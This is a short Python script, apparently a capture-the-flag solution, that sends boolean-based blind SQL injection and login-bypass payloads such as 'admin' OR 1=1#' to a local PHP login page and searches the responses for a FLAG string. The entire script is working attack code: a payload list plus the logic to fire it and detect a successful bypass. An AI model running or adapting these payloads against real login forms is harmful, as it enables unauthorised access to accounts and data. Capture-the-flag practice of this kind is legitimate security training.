import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[*] Testing boolean-based blind SQL injection with proper detection\n")

# Test with proper GET requests
test_cases = [
    ("admin' AND 1=1#", "TRUE: 1=1"),
    ("admin' AND 1=0#", "FALSE: 1=0"),
    ("admin' OR '1'='1'#", "BYPASS: OR 1=1"),
    ("admin' OR 1=1#", "BYPASS: OR 1=1 numeric"),
    ("' OR '1'='1'#", "BYPASS: universal"),
    ("' OR 1=1#", "BYPASS: universal numeric"),
]

results = {}
for payload, desc in test_cases:
    r = requests.get(target, params={'username': payload, 'password': 'x'})
    results[desc] = {
        'length': len(r.text),
        'has_not_admin': 'not the admin' in r.text,
        'response': r.text
    }
    print(f"[{desc}]")
    print(f"  Payload: {payload}")
    print(f"  Length: {len(r.text)}")
    print(f"  Has 'not the admin': {'not the admin' in r.text}")
    
    # Check for FLAG
    flags = re.findall(r'FLAG\{[^}]+\}', r.text)
    if flags:
        print(f"  [!!!] FLAG FOUND: {flags[0]}")
    print()

# Check if any bypass worked
print("\n[*] Looking for successful bypass...")
for desc, data in results.items():
    if not data['has_not_admin']:
        print(f"[+] {desc} - Successfully bypassed!")
        print(f"    Response:\n{data['response']}\n")
        flags = re.findall(r'FLAG\{[^}]+\}', data['response'])
        if flags:
            print(f"    [!!!] FLAG: {flags[0]}")

